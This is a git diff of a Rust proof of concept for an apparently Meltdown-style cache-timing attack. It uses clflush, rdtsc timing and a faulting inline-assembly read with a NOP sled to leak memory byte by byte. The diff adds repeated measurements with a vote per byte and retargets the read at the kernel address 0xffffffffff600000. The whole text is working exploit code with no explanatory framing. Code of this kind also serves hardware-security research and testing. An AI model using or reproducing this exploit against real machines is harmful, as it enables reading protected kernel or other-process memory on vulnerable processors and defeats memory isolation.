@@ -9,12 +9,12 @@ use nix::sys::signal::{sigaction, SaFlags, SigAction, SigHandler, SigSet, Signal
 
 const MULTIPLE_OFFSET: usize = 4096;
 const CACHE_LINE_SIZE: usize = 64;
-const NB_TRIES: usize = 1;
-
+const NB_TIMES: usize = 5;
 const TO_LEAK: usize = 0x0123456789abcdef;
+
 static mut TEST_ARR: [u8; 256 * MULTIPLE_OFFSET + CACHE_LINE_SIZE] =
     [127; 256 * MULTIPLE_OFFSET + CACHE_LINE_SIZE];
-static mut HISTOGRAM: [[u64; NB_TRIES]; 256] = [[0; NB_TRIES]; 256];
+static mut HISTOGRAM: [u64; 256] = [0; 256];
 
 static mut BASE_ADDR: usize = 0;
 
@@ -45,33 +45,21 @@ static mut SYNC_POINT: AtomicUsize = AtomicUsize::new(STARTING);
 
 #[inline]
 unsafe fn measure_byte() -> u8 {
-    // generally works better with NB_TRIES = 1, but quite simple to implement this support
-    for j in 0..NB_TRIES {
-        for i in 0..256 {
-            let count_addr = BASE_ADDR as usize + i * MULTIPLE_OFFSET;
-            let delta_tsc;
-            // measure the time
-            asm!("mfence", "lfence", "rdtsc", "lfence", "shl rdx, $32", "or rax, rdx", "mov rcx, rax",
+    for i in 0..256 {
+        let count_addr = BASE_ADDR as usize + i * MULTIPLE_OFFSET;
+        let delta_tsc;
+        // measure the time
+        asm!("mfence", "lfence", "rdtsc", "lfence", "shl rdx, $32", "or rax, rdx", "mov rcx, rax",
                  "movzx r9, byte ptr [{0}]",
                  "mfence", "lfence", "rdtsc", "shl rdx, $32", "or rax, rdx", "sub rax, rcx",
                  in(reg) count_addr,
                  out("rdx") _, out("rcx") _, out("rax") delta_tsc, out("r9") _);
-            HISTOGRAM[i][j] = delta_tsc;
-        }
+        HISTOGRAM[i] = delta_tsc;
     }
 
-    for i in 0..256 {
-        HISTOGRAM[i].sort();
-    }
+    println!("{:?}", HISTOGRAM);
 
-    let medians = HISTOGRAM
-        .iter()
-        .map(|x| x[NB_TRIES / 2])
-        .collect::<Vec<u64>>();
-    //println!("{:?}", HISTOGRAM);
-    println!("{:?}", medians);
-
-    let (idx, _) = medians
+    let (idx, _) = HISTOGRAM
         .iter()
         .enumerate()
         .min_by(|(_, x), (_, y)| x.cmp(y))
@@ -86,27 +74,24 @@ unsafe fn thread_leak_data(nb_bytes: usize) -> Vec<u8> {
     let mut res = Vec::with_capacity(nb_bytes);
 
     for _ in 0..nb_bytes {
-        while SYNC_POINT.load(Ordering::Acquire) != STARTING {}
+        for _ in 0..NB_TIMES {
+            while SYNC_POINT.load(Ordering::Acquire) != STARTING {}
 
-        // prefetch the entries to ensure TLB misses won't impact the measures
-        for i in 0..((256 * MULTIPLE_OFFSET) / CACHE_LINE_SIZE) {
-            std::ptr::read_volatile((BASE_ADDR as usize + i * CACHE_LINE_SIZE) as *const u8);
+            // flush
+            for i in 0..((256 * MULTIPLE_OFFSET) / CACHE_LINE_SIZE) {
+                core::arch::x86_64::_mm_clflush(
+                    (BASE_ADDR as usize + i * CACHE_LINE_SIZE) as *const u8 as *mut u8,
+                );
+            }
+
+            SYNC_POINT.store(READY, Ordering::Release);
+
+            while SYNC_POINT.load(Ordering::Acquire) != ACCESSED {}
+
+            res.push(measure_byte());
+
+            SYNC_POINT.store(STARTING, Ordering::Release);
         }
-
-        // flush
-        for i in 0..((256 * MULTIPLE_OFFSET) / CACHE_LINE_SIZE) {
-            core::arch::x86_64::_mm_clflush(
-                (BASE_ADDR as usize + i * CACHE_LINE_SIZE) as *const u8 as *mut u8,
-            );
-        }
-
-        SYNC_POINT.store(READY, Ordering::Release);
-
-        while SYNC_POINT.load(Ordering::Acquire) != ACCESSED {}
-
-        res.push(measure_byte());
-
-        SYNC_POINT.store(STARTING, Ordering::Release);
     }
 
     res
@@ -124,23 +109,24 @@ unsafe fn thread_perform_access(target_adress: *const u8, nb_bytes: usize) {
     .unwrap();
 
     for i in 0..nb_bytes {
-        while SYNC_POINT.load(Ordering::Acquire) != READY {}
+        for _ in 0..NB_TIMES {
+            while SYNC_POINT.load(Ordering::Acquire) != READY {}
 
-        let target_adress = target_adress as usize + i;
+            let target_adress = target_adress as usize + i;
 
-        if MULTIPLE_OFFSET != 4096 {
             asm!("movzx rax, byte ptr [{0}]", "imul rax, {2}", "add rax, {1}", "movzx rax, byte ptr [rax]",
              // nop sled for the signal handler to skip the access upon segfault
              "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop",
              in(reg) target_adress, in(reg) BASE_ADDR, in(reg) MULTIPLE_OFFSET, out("rax") _);
-        } else {
-            asm!("movzx rax, byte ptr [{0}]", "shl rax, $12", "add rax, {1}", "movzx rax, byte ptr [rax]",
-             // nop sled for the signal handler to skip the access upon segfault
-             "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop",
-             in(reg) target_adress, in(reg) BASE_ADDR, out("rax") _);
-        }
 
-        SYNC_POINT.store(ACCESSED, Ordering::Release);
+            // special version for strides of 4096 bytes
+            //asm!("movzx rax, byte ptr [{0}]", "shl rax, $12", "add rax, {1}", "movzx rax, byte ptr [rax]",
+            // // nop sled for the signal handler to skip the access upon segfault
+            // "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop",
+            // in(reg) target_adress, in(reg) BASE_ADDR, out("rax") _);
+
+            SYNC_POINT.store(ACCESSED, Ordering::Release);
+        }
     }
 }
 
@@ -151,7 +137,18 @@ fn measure_bytes_with_threads(target_adress: usize, nb_bytes: usize) -> Vec<u8> 
         .join()
         .unwrap();
 
-    leaker.join().unwrap()
+    let leaked_bytes = leaker.join().unwrap();
+
+    let mut res: Vec<u8> = Vec::with_capacity(nb_bytes);
+    for i in 0..nb_bytes {
+        res.push(
+            *leaked_bytes[i * NB_TIMES..(i + 1) * NB_TIMES]
+                .iter()
+                .min()
+                .unwrap(),
+        );
+    }
+    res
 }
 
 fn read_ptr(target_adress: usize) -> usize {
@@ -208,6 +205,7 @@ fn main() {
 
     unsafe {
         mman::mprotect(ptr as *mut libc::c_void, 4096, mman::ProtFlags::PROT_NONE).unwrap();
+        //println!("{}", *(0xffffffffff600000 as *const usize));
     }
 
     // try to flush the tlb
@@ -215,5 +213,5 @@ fn main() {
     //    .join()
     //    .unwrap();
 
-    println!("0x{:x}", read_ptr(ptr));
+    println!("0x{:x}", read_ptr(0xffffffffff600000));
 }
